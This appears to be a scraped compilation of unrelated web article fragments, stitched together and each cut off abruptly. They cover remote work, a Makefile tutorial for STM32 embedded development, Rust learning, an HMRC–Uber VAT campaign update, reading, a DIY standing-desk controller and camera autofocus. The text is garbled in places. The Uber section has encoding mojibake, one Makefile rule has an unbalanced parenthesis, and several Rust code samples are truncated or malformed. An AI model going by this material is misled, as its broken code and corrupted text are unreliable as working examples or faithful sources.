<p>People need to learn and get to know their team-mates over dinners and happy hours and serendipitous conversations at the office to learn that they have things in common. Deeper connection achieved after 6 months!</p>



<p>People need to show their grit and resourcefulness in-person; there’s no such thing as dashboards showing key metrics in real time from your pocket’s supercomputer. </p>



<p>Or git-tracking to see which engineer is writing what code.&nbsp;</p>



<p>Or the ability for an executive to present remotely and asynchronously (<a href="http://loom.com/">Loom</a> presentations are my new favorite media) from their own, personal office — like their attic, kitchen or back-house. Right?</p>



<p>To get input on this presentation you’re working on, you need to be able to walk over to Jeff or Divya and ask them in person about it. There’s no such thing as email or google docs. And you can only be on one team and at one place at a time.</p>



<p>Right?</p>



<p>Maybe not.</p>



<p>I once heard an investor say that “the best board members can’t help a company achieve greatness. The best that the best can do is help them avoid the various fatal mistakes startups make.” They are essentially experienced editors, qualifying what *not* to do. </p>



<p><em>Side-bar: This has evolutionary similarities — primates, for example, have more inhibitory neurons than any other animal. And humans have vastly more inhibitory neurons than any other primate. It seems evolution hasn’t just been a process driven by what a species can adaptably ‘do’ but also shaped by what a species is capable of choosing ‘not’ to do. </em></p>



<p>My estimation is that the fundamental role of an executive is similar — editing priorities and removing what the company should not be doing is their fundamental function over anything else. It’s perceived as choosing what to do, but like a skilled surgeon, it’s actually much more about their expertise on what <em>not</em> to do that helps them focus on the few important things that they should do. Focus, like simplicity, after all is the ultimate exercise of remotion.</p>



<p>One layer deeper than that, you have individual contributors — where most of us were in the first ten years of our careers, learning by doing, committing lessons to emotional, neurological pathways we will go on to remember for our entire careers. Learning the why’s behind the what’s and the how’s. Learning the why’s behind doing this and the why’s behind not doing that. It’s here in our careers that we are doing most of the physical labor.</p>



<p>This isn’t too dissimilar to constructing a building. You have an owner (board member), an architect (C-Suite executive), a general contractor (a sub-layer of executive), and the construction worker (individual contributor). Like owners of buildings, in knowledge work and company-building, it’s normal for board members to contribute to multiple companies. </p>



<p>But in 2020, the executives, if they are the “architects” in this analogy, do not have the social convention to work on multiple projects at a time. Why is this the case?</p>



<p>My hunch is that this “norm” is more geographical than it is structural or beneficial. In other words, the architect does most of his or her work at a desk in an office, away from the project itself. Checking in often, of course, but much of the work happens “off-site” out of necessity. And this has been the case for decades. This “off-site” physical detachment opened up the freedom for first-principles, fundamental, thoughtful answers to the question: “Could I, as an architect, work on multiple projects at once? Perhaps at different stages? That require different amounts of my attention?”</p>



<p>The answer, it turns out, was not only “yes” but that it was actually professionally prudent to do so. To have multiple clients and bets. The geographic, spatial distance created this question… and smart architects created the precedent that became the convention that has now become the obvious answer (yes).</p>



<p>With the world being thrown into a distributed work-style with Covid-19 two months ago, where every …</p></div></div>

  <article>
  <p><img src="http://reecestevens.me/pics/cli_workflow.png" alt="Command Line Workflow"></p>

<p>There are a few things I should disclose before I get into this post:</p>

<ol>
<li>I am a lover of all things terminal.</li>
<li>I am a big <code>vim</code> enthusiast (although certainly not an expert).</li>
<li>I love embedded development.</li>
<li>I really don't love programming in IDEs.</li>
</ol>

<p>Unfortunately, for most of my programming education, I believed that statements
3 and 4 were mutually exclusive. Every embedded project I had worked on
required the use of Keil uVision, Code Composer, Eclipse... the usual
suspects. There is nothing inherently wrong with any of these programs, and in
fact, they significantly lower the barrier to entry for embedded development.
They're widely used for a reason! </p>

<p>That said, I was always slightly frustrated when I
started a project by clicking through a wizard, selecting "Project Template",
and seeing a bunch of mysterious files and directories pop up in my workspace.
What did all that stuff do? Why couldn't I see what was going on? What was all
this boilerplate code doing in my project, and was all that complexity really
necessary? When I would express this frustration to teammates, I would often
get replies like, "Well you can just read the datasheet and program all the
registers manually if you want. Be my guest!" Teams can be snarky sometimes. </p>

<p>And so, when I began working on FreePulse, I began researching to see if there
was a better way. Just before I had given up hope, I came across <a href="https://liviube.wordpress.com/2013/04/22/blink-for-stm32f4-discovery-board-on-linux-with-makefile/">this
wonderful blog post</a> detailing how the author had built
a Makefile for a project on the STM32F4 Discovery board. Seeing as I was
starting my redesign of FreePulse using the same chip, I decided to jump in and
try to drop Eclipse entirely. I'm really pleased with the result, and hopefully
this blog post can guide other people who want to develop for embedded
platforms independent of an IDE.</p>

<p>I'm going to do a brief overview of <code>make</code>, go through some specifics of how to
use <code>make</code> to perform most of the useful IDE compilation functions, and show
how you can integrate that into a very smooth development workflow using only
<code>vim</code> and the command line. Feel free to skip around if you feel like you've
got a good handle on how <code>make</code> works!</p>

<h2>Introducing the Makefile</h2>

<p>When starting out any coding project, one of the first things I do is try to
determine the layout of the program in a <code>Makefile</code>. From the people at the
<a href="https://www.gnu.org/software/make/">Free Software Foundation</a>: </p>

<blockquote>
<p>GNU Make is a tool which controls the generation of executables and other 
  non-source files of a program from the program's source files. <a href="https://www.gnu.org/software/make/">1</a> </p>
</blockquote>

<p><code>make</code> is pretty awesome. While I'm not going to do an exhaustive tutorial on
everything you can do with <code>make</code> (partly because that would take too long, and
partly because I'm still learning more all the time), I'll use it as a tool to
outline the structure of an embedded program. </p>

<p>A broad outline of an embedded development project, in <code>Makefile</code> syntax, would
be:</p>
<div><pre><code data-lang="make"><span># Source Files (all *.c or *.cpp files)</span>
<span>SRCS</span>  <span>=</span> path/to/my/first/source/file.c
<span>SRCS</span> <span>+=</span> path/to/my/second/source/file.c
<span># ...etc</span>

<span># Directories containing your header files (all *.h files)</span>
<span>INC_DIRS</span>  <span>=</span> first/library/with/inc
<span>INC_DIRS</span> <span>+=</span> second/library/with/inc
<span># ...etc</span>
<span>INCLUDE</span> <span>=</span> <span>$(</span>addprefix -I,<span>$(</span>INC_DIRS<span>))</span>

<span># Any compiler options you need to set</span>
<span>CFLAGS</span>  <span>=</span> -Wall 
<span>CFLAGS</span> <span>+=</span> -std<span>=</span>c++11 <span># ...etc </span>

<span># Linker Files (all *.ld files)</span>
<span>LFLAGS</span> <span>=</span> -Tfirstfile.ld -Tsecondfile.ld

<span># Tell make how to compile your *.c files into *.o files </span>
<span>%.o</span><span>:</span> %.<span>c</span>
    gcc -c -o <span>$@</span> <span>$&lt;</span> <span>$(</span>CFLAGS<span>)</span>

<span># Finally, tell make how to build the whole project</span>
<span>final_binary.elf</span><span>:</span> <span>$(</span><span>SRCS</span><span>)</span>
    gcc <span>$(</span>INCLUDE<span>)</span> <span>$(</span>CFLAGS <span>$(</span>LFLAGS<span>)</span> <span>$^</span> -o <span>$@</span>
</code></pre></div>
<p>Woah. While that may seem like a lot to take in, I promise that it's actually
very simple to understand! To break it down:</p>

<ul>
<li><p>We declare our source files, indicated by the .c or .cpp file extensions. These 
hold all the code that makes our awesome application, and it also holds any
source files required by the device libraries.</p></li>
<li><p>We declare the folders that are holding all of our include files, indicated
by the .h file extension. Include files let our separate C/C++ files use
each others functions by holding function declarations, and you tell the
compiler what functions you want by the <code>#include "somefile.h"</code> directive.
It's really important to note (and easy to forget) that <strong>your different
source files don't automagically know what each other contain.</strong> If it isn't
declared in the header file and the header file isn't <code>#include</code>d in the
target file, it won't compile. The <code>addprefix</code> function at the end does just
what you'd expect, since our compiler needs the little <code>-I</code> flags in front of
our include directories to know to look there for our stuff.</p></li>
<li><p>We declare any compiler options, or flags, that are necessary to make the
final binary file that will be saved in the microcontroller memory. I'll go
into exactly what flags you should use a little later in this post.</p></li>
<li><p>We declare all of the linker files, indicated by the .ld file extension, that
we need to use. Linker files are actually for another program by the people
at the Free Software Foundation, appropriately called <code>ld</code> (now the file
extension makes sense). <code>ld</code> is automatically called by <code>gcc</code> or <code>g++</code>, the
two primary C/C++ compilers, so we don't have to worry about the nitty
gritty. Basically though, <code>ld</code> helps tell the compiler <em>how</em> our program is
aligned when it's finally compiled. More on this later.</p></li>
</ul>

<p>The last two blocks of this <code>Makefile</code> snippet is where the magic happens. 
These are rules, which <code>make</code> will use to compile your program. The syntax of
a rule is:</p>
<div><pre><code data-lang="make"><span>target</span><span>:</span> <span>dependencies</span>
    commands to make target from dependencies
</code></pre></div>
<p>The first rule is a special kind of rule in <code>make</code> called a <a href="https://www.gnu.org/software/make/manual/html_node/Pattern-Rules.html#Pattern-Rules">pattern
rule</a>. This rule tells <code>make</code> that if we ever want to make
an object file (i.e. <code>target = %.o</code>) out of a source file (i.e. <code>dependencies =
%.c</code>), we should use the commands specified below by the four-space
indentation. But what on earth was that command given in the example above?</p>
<div><pre><code data-lang="make"><span>%.o</span><span>:</span> %.<span>c</span>
    gcc -c -o <span>$@</span> <span>$&lt;</span> <span>$(</span>CFLAGS<span>)</span>
</code></pre></div>
<p>As we've mentioned before, <code>gcc</code> is a compiler; the <code>-c</code> flag specifies that we
want to compile a source file, and the <code>-o</code> flag says that the next argument
will be the name of the output file. And that name is... <code>$@</code>?</p>

<p>Turns out, there's one last little thing about <code>make</code> we need to learn:
<a href="https://www.gnu.org/software/make/manual/html_node/Automatic-Variables.html#Automatic-Variables">automatic variables</a>. You can read the doc page about all the
different automatic variables that <code>make</code> provides you, but we're going to
focus on the two that we just used here:</p>

<ul>
<li><p><code>$@</code> represents whatever our <code>target</code> is. In this case, <code>$@ == %.o</code>.</p></li>
<li><p><code>$&lt;</code> represents the <strong>first</strong> dependency to the right of the colon. In this
case, since only one dependency is listed, <code>$&lt; == %.c</code>. </p></li>
</ul>

<p>So, after doing a little translation, we see that the pattern rule is telling
<code>make</code> that for every source file (<code>%.c</code>) that we want to turn into an object
file (<code>%.o</code>), it should call our compiler (<code>gcc</code>), tell it to compile (<code>-c</code>)
our source file (<code>$&lt;</code>) into the output file (<code>-o $@</code>) with some compiler
options that we specify (<code>$(CFLAGS)</code>). Not too bad! You're already on your way
to [groking][grok_article] <code>make</code>.</p>

<p>Finally, we have our last rule, which is where everything comes together. </p>
<div><pre><code data-lang="make"><span>final_binary.elf</span><span>:</span> <span>$(</span><span>SRCS</span><span>)</span>
    gcc <span>$(</span>INCLUDE<span>)</span> <span>$(</span>CFLAGS<span>)</span> <span>$(</span>LFLAGS<span>)</span> <span>$^</span> -o <span>$@</span>
</code></pre></div>
<p>We've pretty much covered everything in this rule except for the <code>$^</code> variable,
which is just another <a href="https://www.gnu.org/software/make/manual/html_node/Automatic-Variables.html#Automatic-Variables">automatic variable</a>. <code>$^</code> stands for
<em>every</em> file in the dependencies list, as opposed to <code>$&lt;</code>, which only
represents the <em>first</em>. A cheesy way to remember that is to look at the
direction of the arrow! And armed with that last little bit of knowledge, we
can confidently translate this last rule:</p>

<p>Take all our source files (<code>$(SRCS)</code>), and make them into a final output binary
called <code>final_binary.elf</code>. To do that, call our compiler (<code>gcc</code>), tell it where
our include directories are (<code>$(INCLUDE)</code>), specify our compiler options
(<code>$(CFLAGS)</code>) and our linker files (<code>$(LFLAGS)</code>), and finally give it all our
source files (<code>$^</code>) and tell it what we want the output to be (<code>-o $@</code>). </p>

<p>And just like that, we've outlined the basic build of a C/C++ project!</p>

<h2>Make Make Work for Embedded Programming </h2>

<p>Because of some of the unique aspects of programming for a microcontroller, we
need to be a little more explicit with <code>make</code> about some things. This is where
<a href="https://liviube.wordpress.com/2013/04/22/blink-for-stm32f4-discovery-board-on-linux-with-makefile/">Liviu's blog post</a> really gave me some crucial
guidance; also, this is where we can see how building a <code>Makefile</code> lets us peek
into the mystery of what happens when we hit the "compile and run" button on an
IDE.</p>

<p>Firstly, we need to specify what kind of compiler we'll use. While you may have
<code>gcc</code> or <code>g++</code> installed on you machine, they are built to compile programs on 
your computer architecture. We'll need a special version of <code>gcc</code>, called a
<em>cross-compiler</em>, so that we can compile across architectures to the ARM
architecture. You can download it from <a href="https://launchpad.net/gcc-arm-embedded">this site mirror</a>, or
look for it in a package manager like <code>homebrew</code> (OSX), <code>apt-get</code> (Ubuntu), 
<code>pacman</code> (for Arch Linux), or similar for your distro. </p>

<p>Once you've got the cross-compiler toolset installed, the programs will<br>
probably have really long names (<code>arm-none-eabi-g++</code>, for example). That's
going to be a pain to type all over your <code>Makefile</code>, so you can make variables
to hold the path to your tools. I used <code>TOOLS_DIR</code> to hold the path to the
executables directory in the cross-compiler toolset, and then specified
the tools I'd be using:</p>
<div><pre><code data-lang="make"><span>CC</span>      <span>=</span> <span>$(</span>TOOLS_DIR<span>)</span>/arm-none-eabi-g++
<span>OBJCOPY</span> <span>=</span> <span>$(</span>TOOLS_DIR<span>)</span>/arm-none-eabi-objcopy
<span>GDB</span>     <span>=</span> <span>$(</span>TOOLS_DIR<span>)</span>/arm-none-eabi-gdb
</code></pre></div>
<p>Next, we need to specify the <code>CFLAGS</code> that will help us to compile our program.
Liviu's <code>Makefile</code> was extremely helpful in that it logically grouped the
flags, so we can get a better idea of what's going on. I'm not going to give an
exact description of each flag (you can look up the linked docs for that), but I
will give an overview of each group:</p>

<ul>
<li><code>CFLAGS  = -ggdb</code> sets <a href="https://gcc.gnu.org/onlinedocs/gcc/Debugging-Options.html#Debugging-Options">debugging options</a> so that the compiler will send
information in a format that <code>gdb</code>, the debugging program we'll be using
later, can understand. </li>
<li><code>CFLAGS += -O0</code> tells the compiler to <a href="https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html#Optimize-Options">perform no optimizations</a> on the code.
This is important …</li></ul></article></div></div></div></div>

<p>In this podcast episode of Security Headlines: Carl Lerche, Rust developer and<br>
maintainer of the popular Rust programming library Tokio joins us.<br>
He walks us through what Rust and Tokio is, how companies are building their stacks with Rust.<br>
This and a lot more on this episode of Security Headlines!</p>

<p>Carl heard about this new programming language called Rust and wanted to check it out.
What started as a hobby project led Carl down the rust path and he now works for Amazon as a<br>
Rust developer! Helping Amazon build stable infrastructure.</p>

<p>We get to hear the story of how Tokio got started and how the Rust programming language has changed<br>
over the years.<br>
Since a large chunk of Tokio code is focusing on making it easy for developers to write asynchronous functions.<br>
And be able to write fast code that does not get stuck and lets the data flow.<br>
But how does non-blocking code really work? What differs Rust from the programming language Golang is<br>
Golangs, adoption of green threads instead of using regular threads.<br>
Carl walks us through how this works and how Rust tackles this problem “the Rust way”.</p>

<p>Do you want to build reliable network services with Rust?<br>

<h2 id="my-first-date-with-rust---know-thy-enemy">My First Date with Rust - Know Thy Enemy</h2>
<p>As a working programmer with several mainstream languages under your belt (eg <code>Java</code>, <code>C#</code>, <code>javascript</code>, <code>python</code>, etc) it's reasonable to expect that after a bit of orientation with quirks and syntax you'll find yourself somewhat productive. If you know Rust you won't be surprised when I say my experience was... humbling. </p>
<p>The last time I felt so dumb was probably more than a decade ago, as a novice programmer teaching myself Object Orientated Programming (OOP). I think that's the point, new paradigms require effort to build a working mental model for. And depending on where you start on the ladder you might have quite a lot of mental rebuilding to do.  </p>
<p>Rust intentionally tries to be "boring". That is to say, its DNA borrows liberally from prior art. If you're familiar with manual memory management (<code>C</code>, <code>C++</code>, <code>Obj-C</code>) you'll probably understand pointers in Rust. If you're familiar with functional languages (<code>Haskell</code>, <code>Elm</code>, <code>Clojure</code>, <code>OCaml</code>) you'll have an immediate start recognising the type system. The reason it aims for boring is because it spends its entire novelty budget on the one unique idea: automatic scope based memory allocation (aka the borrow checker). This is the knockout feature: <strong>the performance of C with the safety of garbage collected languages.</strong></p>
<p><a href="http://intorust.com/" target="_blank" rel="nofollow noopener noreferrer">Plenty</a> <a href="https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html" target="_blank" rel="nofollow noopener noreferrer">of ink</a> <a href="https://squidarth.com/rc/rust/2018/05/31/rust-borrowing-and-ownership.html" target="_blank" rel="nofollow noopener noreferrer">has been</a> <a href="https://dev.to/strottos/learn-rust-the-hard-bits-3d26" target="_blank" rel="nofollow noopener noreferrer">written</a> about ownership and the borrow checker. It follows the most unprecedented feature would have the most said about it. There seems to be a common refrain: "<em>It's really hard at first, but stick with it. You'll see, it changes everything</em>". Sounds suspiciously like Vim or Emacs users (please don't fight me). Is it the promised land or just a severe case of Stockholm syndrome?     </p>
<p>Nevertheless, extensive reading had prepared me to expect a big ol' messy fight with the borrow checker. We did tussle, but it went better than expected. Ironically, after years of <code>C#</code> game development, performance concerns have taught me much of the internal dialogue needed to reason about memory lifetimes: "Is this allocated on the stack or heap? Is this going to create allocation (garbage collection) pressure? Is this copying data or mutating it in place?"</p>
<p>In this sense, when the borrow checker complained I could at least appreciate what it was trying to protect me against. And as to be expected, it may be a while yet before I fully grok lifetimes. Controversially though, "Rust's expressive type system" put up a stiffer fight than I anticipated.</p>
<h2 id="stubbing-toes-on-functional-programming">Stubbing Toes on Functional Programming</h2>
<p>Before anyone grabs a pitchfork, this isn't a rant about the unnecessary burden of type systems. Throughout my career, I've favoured statically and strongly typed programming languages. I believe in correctness, and tooling should help you get there. It's why Rust excites me.</p>
<p>Taken to its ultimate conclusion, one arrives at <code>Haskell</code> and other pure functional programming (FP) languages. FP's conceit is trading performance for correctness. As a concerned game developer, this never felt like a bargain I could entertain. Not that it's prevented FP idioms from seeping into the groundwater of other programming languages (see <code>LINQ</code> in <code>C#</code> or <code>map() filter() reduce()</code> in <code>javascript</code> as examples).   </p>
<p>You can see signs of this functional DNA written all over Rust too, immutability by default being the most obvious. However, Rust strikes a wonderfully pragmatic balance. Imperative programming is not outlawed, and many escape hatches exist. Rust is, as far as I'm aware, <strong>the first language that allows you to deploy functional concepts as zero-cost abstractions</strong>. If the borrow checker is the obvious hit single, this is the real album sleeper hit. </p>
<p>I think my undoing was simply that I had a false expectation of equivalence. I'm confident in my type literacy and I can, if we must, talk in-depth about Java design patterns. I've never courted a "proper" functional language, but I recognise their influence. I understood "expressive type system" to be a superset of what I already know. In some respects it is, but in others, it was fundamentally different. I want to share some of my "aha" moments because I haven't seen much written with this lens...  </p>
<h2 id="use-rust-analyzer">Use Rust Analyzer!</h2>
<p>To anyone following my footsteps: <strong>setup your dev environment for code intelligence and type hints</strong> is my best advice. I intentionally offer it here before any code samples make you glaze over and miss it.  </p>
<p><img src="https://thefuntastic.com/blog/2020-10-Rust-Analyser.png" title="Screenshot of Rust Analyser extension in Visual Studio extensions gallery"></p>
<p>At the time of writing (Oct 2020), I found Visual Studio Code with the <a href="https://marketplace.visualstudio.com/items?itemName=matklad.rust-analyzer" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a> extension to be the most reliable path. I learnt this only after naively installing the <a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust" target="_blank" rel="nofollow noopener noreferrer"><code>Rust</code></a> extension, which provides a front end for both the earlier <a href="https://github.com/rust-lang/rls" target="_blank" rel="nofollow noopener noreferrer"><code>RLS</code></a> and the more modern <a href="https://rust-analyzer.github.io/" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a>. However, in my experience, the native <code>rust-analyzer</code> extension was vastly superior.</p>
<h2 id="taste-testing-rusts-flavour">Taste Testing Rust's Flavour</h2>
<p>If you can express something as a type, the compiler can offer you guarantees about it. An expressive type system allows you to model domains that weren't possible before, often using simpler machinery too. Rust takes this affordance and runs with it. Types are used for everything, and I do mean <strong>everything</strong>. A lot of problems didn't quite make sense until I learnt to recognise them for what they were: type errors. </p>
<p>However, starting out, there are a few obvious differences I'd put into the "quirks" category. They seem foreign and strange, but acclimatisation comes quickly. I'll only briefly touch on them for those who've never seen Rust before. Exhaustive coverage exists in <a href="https://doc.rust-lang.org/book/ch05-00-structs.html" target="_blank" rel="nofollow noopener noreferrer">the Rust book</a> and <a href="https://fasterthanli.me/articles/i-am-a-java-csharp-c-or-cplusplus-dev-time-to-do-some-rust" target="_blank" rel="nofollow noopener noreferrer">elsewhere</a>.</p>
<p><strong> Rust doesn't have <code>classes</code> and only uses <code>structs</code>:</strong>   </p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span>

    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>  </pre>
<p><em>"Cool cool. Structs are kinda like classes anyway"</em></p>
<p><strong>Methods are defined in <code>impl</code> blocks instead of the <code>struct</code> definition: </strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span>

<span>}</span></pre>
<p> <em>"Okay, separate <code>impl</code> blocks seem like a weird choice. Kinda reminds me of <code>C</code> header files..."</em></p>
<p> Calling methods defined in types is done with a <code>C++</code> like syntax, e.g. <code>Type::method_name()</code>. However, once an instance exists (aka memory has been allocated), members are accessed with regular dot syntax, e.g. <code>instance.method_name()</code>:</p>
<pre><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
    <span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span> 
    
    <span>let</span> y <span>=</span> position<span>.</span>y<span>;</span> 
<span>}</span></pre>
<p><strong>There's no inheritance. Shared behaviours are defined in <code>Traits</code>.</strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span>

<pre><span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span>

position<span>.</span><span>draw</span><span>(</span><span>)</span><span>;</span> </pre>
<p>That's enough for now, but know there are other plenty of other commendable <a href="https://stevedonovan.github.io/rust-gentle-intro/2-structs-enums-lifetimes.html" target="_blank" rel="nofollow noopener noreferrer">type features</a>, some of which we'll discuss later.</p>
<h2 id="where-the-functional-rubber-meets-the-road">Where the Functional Rubber Meets the Road</h2>
<p>Giant monolithic classes are considered a code smell. A signal that responsibilities need to be separated into separate concerns. Still, OOP maintains the feeling of discrete units. Data and behaviour are contained within the cell walls of the class, or at least within the inheritance chain.   </p>
<p>Rust, by comparison, feels inside out, "itty bitty" and piecemeal. What might have been a single class is instead an accumulation of structs and traits, each defining their own narrow window into data and behaviour. <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank" rel="nofollow noopener noreferrer">In this talk</a>, the creator of Clojure, another functional language, describes this quality as "ad-hoc polymorphism". Using only what you need, when you need it. This granular approach maximises the immutable surface area, mutability is limited to where it's necessary.   </p>
<p>In the flame wars of "was OOP a giant mistake?", it's debatable whether <a href="https://stevedonovan.github.io/rust-gentle-intro/object-orientation.html" target="_blank" rel="nofollow noopener noreferrer">Rust allows you to write OOP code</a>. I understand this now not as a wholesale rejection: abstraction and encapsulation remain necessary tools. However, Rust forces you to leave behind features ardents consider harmful, inheritance being the obvious example. Call it "OOP, the good bits" if you will. </p>
<p>Ideas like composition over inheritance or separating data from behaviour have been around for a long time within the OOP world. However, FP encourages new principles, determinism and the avoidance of side effects. Let's look at an example. </p>
<h3 id="fixing-the-billion-dollar-mistake">Fixing the Billion Dollar Mistake</h3>
<p>Tony Hoare, the inventor of the null pointer called it <a href="https://en.wikipedia.org/wiki/Tony_Hoare#Apologies_and_retractions" target="_blank" rel="nofollow noopener noreferrer">his billion-dollar mistake</a>. Any programmer knows the misery of finding an error log littered with <code>Null Reference Exception</code>. But <code>null</code> values are fundamental, like the oxygen we breathe. Whenever I tried to contemplate an alternative I suffered a failure of imagination. <em>"No null values? Far out man."</em> </p>
<p>For a while, in prior languages, I attempted to answer this question by initialising variables with a default value instead of <code>null</code>. That worked when the default value meant something, otherwise, it just piped junk data into the system. Still, in successful cases, I began to appreciate the guarantee  it offered. Any downstream code could trust a variable would be valid and not have to muddy itself with unexpected exceptions.</p>
<p>Software is such that, unfortunately, there will always be cases where initialisation or access of a resource fails. FP provides us with a more complete answer here. It …</p></div></div>

            <div id="page">
                <p><span>Way back in April 2017, we announced we were going to take on HMRC’s</span> <a href="https://rebrand.ly/data-parliament-2017">failure to assess</a> <span>Uber to VAT which corroded public trust, not only in HMRC, but in politics more generally.Â&nbsp;</span></p>
<p><span>And itâ€™s been quite the scrap…Â&nbsp;</span></p>
<p><span>There have been lows – like us spending the money we raised in the crowdfunder trying to get a protective costs order and failing.Â&nbsp;</span></p>
<p><span>And there have been highs – like us persuading the High Court </span><a href="https://rebrand.ly/ewhc-2019"><span>late last year</span></a><span> that a fairly spineless HMRC was allowed to do what the legislation plainly allowed it to do and tell us it had (at last) assessed Uber.</span></p>
<p><span>There have been further lows – as last week when the Court of Appeal refused us permission to bring our judicial review against HMRC.</span></p>
<p><span><span>But ultimately </span><span>we triumphed</span><span>. </span></span><a href="https://rebrand.ly/ussec-10q"><span>Uber’s US accounts</span></a><span> now confirm that HMRC has assessed Uber to VAT on fares – both prospectively and retrospectively.</span></p>
<p><span>And thatâ€™s all we ever wanted.Â&nbsp;</span></p>
<p><span><span>It’s been a long, bumpy (and expensive) ride – if you’ll allow me the metaphor – but we have reached our destination. I am so proud that together we have forced HMRC, belatedly, to act – </span><span>Uber has now been asked to pay the Â£1.5bn of tax they owe the public purse.</span></span></p>
<p><span>We couldnâ€™t have done it without your support. So thank you.</span></p>
<p><span>Iâ€™d also like to thank the lawyers – George Peretz QC, Jack Anderson, Hui Ling McCarthy QC, Christopher Knight, David Greene, Vikram Sachdeva QC, and Alex Rook – who helped out, most for even less than the smell of an oily rag, along the way.</span></p>

        <blockquote>
<p>‘A room without books is like a body without a soul.’<br>
– Marcus Tullius Cicero</p>
</blockquote>
<p>Books can change your life.</p>
<p>And because of this, I believe we should give books our lives.</p>
<p>See, the brain acts much like a filter. It first observes everything in the world, but then begins the process of feeding the beholder of that brain with limited information. This information directly serves the person’s day-to-day priorities as it desperately acts on a kind of survival instinct. When concerned about the immediate down-to-earth tasks, the brain does little in its way to filter through patterns usually unseen.</p>
<p>A book, however, carries the power to enable a new priority to dictate what enters the mind and the self. The often beautifully crafted words lend the writer permission to provide the reader with a new perspective. Whether if it is a temporary shift or a harmonic, permanent one – a good book can give the reader the ability to change the frequency of it’s internal radio in order to receive new, yet already existing signals.</p>
<p>Books are, simply put, the greatest form of escapism. Whilst like other forms, they allow us to free ourselves of commonplace worldview; a book’s impact on the mind can profoundly alter the reality in which we continue to experience. Scottish whisky distiller, Thomas Dewar, famously spoke out that ‘minds are like parachutes; they only function when open’ and books encourage the parachute cord to be pulled.</p>
<p>Do note, however, that books do not do this by simply sitting proudly on a bookshelf of ego, speaking on behalf of the host at showy dinner parties. No. They require the reader to engage deeply. To hold hands with the writer and let their intentionally crafted pace guide the mind through complex and acroamatic ideas.</p>
<figure><img alt="" src="https://justincampbellplatt.com/media/pages/blog/books-for-life/d55a098df6-1601212153/reading.jpg"></figure>
<p>Nowadays, I frequently arrive toward the end of the month with a hilariously large number floating above the Amazon basket icon. There is not one single item on this large list that isn’t a book. My whole Amazon experience is now exclusive to acquiring great mind-altering writings. Fantasy novelist George R.R. Martin also reads ferociously and attributes this to his strong belief that ‘a mind needs books as a sword needs a whetstone if it is to keep its edge.’</p>
<p>Books have the power to expand the worldview of the reader but are limitless in their ability to do so. They hold tremendous long-term merit as re-reading conducts notions the mind had not previously tempted. Deep personal experiences between reads nudge you to dance with the words you’ve previously danced with, but now, to a different song. Step intentionally, and you’ll find the new song liberating. It’s a complex yet freeing tango, infusing the past, rigid self with the new, more open one.</p>
<p>Books. Give them your life and they will reciprocate with more life. As Ernest Hemingway put it best, <strong>‘there is no friend as loyal as a book.’</strong></p>

It's a decent, solid work desk but the default controller that it came with is poor, only allowing you to raise and lower via a set of small push-buttons.

The circuit is open by default with no electricity flowing. When you press a button, it closes the circuit allowing electricity to flow to the motor which will rise or fall. Which direction the motor runs depends on whether you connect live or neural <sup>[citation needed]</sup><br></p><p>To be able to actually re-wire this though and hook everything up the relays, you need to actually understand it working in more detail.

		With everything wired up correctly I could now control both an "up" relay and "down" relay via code.
	</p></section><section><div><h2>Height Sensors</h2><p>With the ability to raise and lower the desk via the relays (and code), I needed to think about how to actually control the desk and get it into a comfortable standing or sitting position automatically.</p><p>One easy approach is to simply raise or lower the desk for a certain amount of time. In other words, to get into the "standing" position just enable the "up" relay for 5 seconds. To go back to "sitting" enable the "down" relay for 5 seconds.</p><p>This doesn't really work though. The desk lowers much more quickly than it raises (due to gravity) so it's very hard to get the correct timings. Furthermore you can easily get out-of-sync, meaning you have to manually adjust the height again, making the whole endeavour pointless (of course I only realised this once I had assembled everything).</p><p>A better approach is to use a height sensor. These are small little devices that send out a sound wave and measure how long it takes to return. With some simple maths you have the height of the ground.<br></p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none" alt="IMG 4499" title="IMG 4499" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none"><figcaption>

<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pryc-wp-acctp-original-content"><p>The focusing system your camera uses makes a big difference to its effectiveness. If you want to get the most out of your camera’s autofocus then it’s important to know how it works. It’s also helpful to understand the differences between phase detection and contrast detection autofocus (AF), as these are the two systems used in modern digital cameras.</p>
